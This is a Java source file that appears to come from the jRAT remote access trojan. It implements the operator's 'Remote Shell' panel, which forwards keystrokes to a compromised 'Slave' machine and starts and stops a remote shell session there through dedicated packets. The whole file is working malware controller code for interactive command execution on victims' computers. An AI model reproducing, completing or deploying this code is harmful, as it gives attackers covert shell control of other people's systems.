package jrat.module.shell.ui;

import com.redpois0n.terminal.InputListener;
import com.redpois0n.terminal.JTerminal;
import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.module.shell.packets.Packet22RemoteShellTyped;
import jrat.module.shell.packets.Packet23RemoteShellStart;
import jrat.module.shell.packets.Packet24RemoteShellStop;

import javax.swing.*;
import java.awt.*;

@SuppressWarnings("serial")
public class FrameRemoteShell extends ClientPanel {

	private JTerminal terminal;

    public FrameRemoteShell(Slave s) {
		super(s, "Remote Shell", Resources.getIcon("terminal"));

		setLayout(new BorderLayout(0, 0));

        JScrollPane scrollPane = new JScrollPane();
		terminal = new JTerminal();
		scrollPane.setViewportView(terminal);

		terminal.addInputListener(new InputListener() {
			@Override
			public void processCommand(JTerminal terminal, char c) {
                send(c);
			}
			
			@Override
			public void onTerminate(JTerminal terminal) {
				slave.addToSendQueue(new Packet24RemoteShellStop());
				slave.addToSendQueue(new Packet23RemoteShellStart());
			}
		});
		
		add(scrollPane, BorderLayout.CENTER);

		addKeyListener(terminal.getKeyListener());
		setSize(675, 300);
    }
	
	private void send(char c) {
        slave.addToSendQueue(new Packet22RemoteShellTyped(c));
	}
	
	public JTerminal getTerminal() {
		return terminal;
	}

	public void opened() {
        slave.addToSendQueue(new Packet23RemoteShellStart());
    }

	public void dispose() {
        super.dispose();
		slave.addToSendQueue(new Packet24RemoteShellStop());
	}
}
